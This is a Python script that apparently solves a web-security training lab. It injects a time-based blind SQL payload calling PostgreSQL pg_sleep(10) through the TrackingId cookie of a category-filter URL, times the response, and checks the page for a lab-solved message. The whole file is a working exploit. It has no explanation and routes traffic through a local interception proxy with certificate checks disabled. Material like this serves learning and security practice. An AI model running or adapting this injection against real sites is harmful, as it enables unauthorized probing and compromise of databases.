import sys
import time
import logging
import argparse
import urllib3

import requests

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}

log = logging.getLogger(__name__)
logging.basicConfig(
    
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()


def normalize_url(url):
    if not url.endswith("/"):
        url = url + "/"
    return url

def is_solved(url, no_proxy):
    def retrieve_contents(url, no_proxy):
        log.info("checking if solved.")
        if no_proxy:
            resp = requests.get(url)
        else:
            resp = requests.get(url, proxies=PROXIES, verify = False)
        if "Congratulations, you solved the lab!" in resp.text:
            log.info("Lab is solved!")
            return True
    solved = retrieve_contents(url, no_proxy)
    if solved:
        return True
    else:
        time.sleep(2)
        return retrieve_contents(url, no_proxy)
    
def main(args):
    url = normalize_url(args.url)
    exploit_payload = "xyz'%3b+SELECT+pg_sleep(10)--"
    exploit_url = url + "filter?category=Lifestyle"
    cookies = {"TrackingId": exploit_payload}
    
    log.info(f"sending sqli payload in cookie to {exploit_url}")
    if args.no_proxy:
        resp = requests.get(exploit_url, cookies=cookies)
    else:
        resp = requests.get(exploit_url, cookies=cookies, proxies=PROXIES, verify=False)
        
    if resp.elapsed.total_seconds() >= 10:
        log.info("Time-based SQLi successful! The payload caused a delay.")
    else:
        log.info("SQLi payload did not trigger a delay.")

    if is_solved(url, args.no_proxy):
        log.info("Congrats!")
    else:
        log.info("Not Solved:(.")

if __name__ == "__main__":
    args = parse_args(sys.argv)
    main(args)